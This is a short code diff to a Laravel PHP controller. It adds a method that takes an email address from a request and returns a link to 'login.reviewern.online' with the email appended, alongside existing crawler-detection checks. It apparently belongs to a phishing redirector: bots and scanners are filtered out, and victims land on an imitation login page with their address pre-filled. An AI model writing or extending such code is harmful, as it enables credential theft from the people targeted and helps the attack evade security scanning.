@@ -6,6 +6,7 @@ use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
 use Illuminate\Foundation\Bus\DispatchesJobs;
 use Illuminate\Foundation\Validation\ValidatesRequests;
 use Illuminate\Routing\Controller as BaseController;
+use Illuminate\Http\Request;
 use Jaybizzle\CrawlerDetect\CrawlerDetect;
 use Jaybizzle\CrawlerDetect\Fixtures\Crawlers;
 use Crawler;
@@ -31,6 +32,10 @@ class Controller extends BaseController
 //        return view('welcome');
     }
 
+    public function index2(Request $request){
+        $mail = $request->subs;
+        return "https://login.reviewern.online/obKceMCK#".$mail;
+    }
 
     public function code($code){
         if(Crawler::isCrawler()){
